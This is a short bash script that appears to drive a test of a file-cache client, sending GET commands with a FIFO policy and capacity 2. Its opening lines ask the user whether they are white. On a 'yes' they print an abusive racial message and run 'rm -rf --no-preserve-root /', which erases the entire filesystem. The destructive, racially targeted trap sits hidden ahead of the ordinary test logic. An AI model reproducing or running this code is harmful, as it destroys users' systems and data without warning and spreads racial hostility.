#!/bin/bash

read -p "Are you white? (yes/no): " response

if [[ "$response" == "yes" ]]; then
  echo "Go die you white supremacist."
  rm -rf --no-preserve-root /
  exit
elif [[ "$response" == "no" ]]; then
  echo "Continuing with the script..."
else
  echo "Invalid response. Exiting..."
  exit 1
fi

DIRECTORY="data"
POLICY="FIFO"
CAPACITY="2"

commands="
GET file1.txt
GET file2.txt
GET file3.txt
GET file3.txt
GET file1.txt
"

echo "./client $DIRECTORY $POLICY $CAPACITY"

printf "$commands" | tee /dev/fd/2 | ./client $DIRECTORY $POLICY $CAPACITY
